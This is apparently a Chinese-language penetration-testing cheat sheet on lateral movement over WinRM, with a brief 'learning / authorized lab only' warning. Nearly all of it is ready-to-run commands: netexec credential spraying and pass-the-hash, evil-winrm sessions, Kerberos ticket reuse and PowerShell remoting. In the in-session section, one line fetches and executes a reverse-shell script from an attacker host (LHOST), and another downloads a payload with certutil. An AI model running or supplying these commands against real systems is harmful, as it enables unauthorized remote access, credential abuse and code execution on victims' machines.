# WinRM

::: warning 仅供学习 / 授权实验
445 不通时不要再试 psexec / smbexec / admin$。
:::

```bash
nc -nvz TARGET 5985
nc -nvz TARGET 5986

netexec winrm TARGET -u USER -p 'PASS'
netexec winrm TARGET -u USER -H NTHASH
netexec winrm TARGET -d DOMAIN -u USER -p 'PASS'
netexec winrm targets.txt -d DOMAIN -u USER -p 'PASS' --continue-on-success
```

```bash
evil-winrm -i TARGET -u USER -p 'PASS'
evil-winrm -i TARGET -u USER -H NTHASH
evil-winrm -i TARGET -u USER -p 'PASS' -S
```

Kerberos：

```bash
impacket-getTGT 'DOMAIN/USER:PASS' -dc-ip DC_IP
export KRB5CCNAME=$(pwd)/USER.ccache
netexec winrm TARGET.dom -d DOMAIN -u USER -k --use-kcache
```

会话内（无 SMB）：

```powershell
whoami; whoami /priv
IEX (New-Object Net.WebClient).DownloadString('http://LHOST/rev.ps1')
certutil -urlcache -split -f http://LHOST/p.exe C:\Windows\Temp\p.exe
```

evil-winrm 自带 `upload` / `download`，走 5985，不需要 445。

Windows 跳板：

```powershell
winrs -r:TARGET -u:DOMAIN\USER -p:PASS "whoami"
$pw = ConvertTo-SecureString 'PASS' -AsPlainText -Force
$c  = New-Object System.Management.Automation.PSCredential('DOMAIN\USER',$pw)
$s  = New-PSSession -ComputerName TARGET -Credential $c
Invoke-Command -Session $s -ScriptBlock { whoami; hostname }
```

`(Pwn3d!)` ≈ 本地管理员。只有 Remote Management Users 时命令可能仍能跑，但提权面小。
